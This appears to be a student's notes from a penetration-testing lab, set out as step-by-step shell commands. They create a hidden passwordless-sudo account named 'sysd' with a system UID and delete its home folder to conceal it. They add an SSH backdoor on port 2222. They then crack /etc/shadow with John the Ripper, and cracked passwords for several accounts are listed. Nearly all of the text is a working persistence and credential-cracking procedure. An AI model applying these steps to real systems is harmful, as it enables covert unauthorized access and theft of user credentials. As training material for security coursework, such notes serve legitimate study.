#Step 1: Shadow People
#Create a secret user named sysd. Make sure this user doesn't have a home folder created:
    sudo adduser sysd
#Give the secret user a password:
    <password-goes-here>

#Give the secret user a system UID < 1000:
    sudo usermod -u 500 sysd

#Give your secret user the same GID:
    sudo groupmod -g 500 sysd

#Give your secret user full sudo access without the need for a password:
    sudo visudo
    sysd ALL=(ALL) NOPASSWD:ALL (do this in visudo as root)

#Test that sudo access works without the password:
    sudo visudo
    sudo cat /etc/passwd
    sudo cat /etc/shadow
    sudo rm -r /home/sysd (this removes the home dir)


#Step 2: Smooth Sailing
#Edit the sshd_config file:
    sudo nano /etc/ssh/sshd_config
    Port 2222 (I wrote this below #Port 22)


#Step 3: Testing Your Configuration Update
#Restart the SSH service:
    systemctl restart ssh

#Exit the root account:
    exit (it should then turn green as sysadmin and say it ended ssh session)

#SSH to the target machine using your sysd account and port 2222:
    ssh sysd@<target-ip-address> -p 2222

#Use sudo to switch to the root user:
    sudo su


#Step 4: Crack All the Passwords
#SSH back to the system using your sysd account and port 2222:
    ssh sysd@192.168.6.105 -p 2222

#Escalate privileges to the root user. Use John to crack the entire /etc/shadow file:
    john /etc/shadow(I did this as root, output is below)
        sysd             (sysd)
        computer         (stallman)
        freedom          (babbage)
        trustno1         (mitnik)
        dragon           (lovelace)
        lakers           (turing)
        passw0rd         (sysadmin)
        Goodluck!        (student)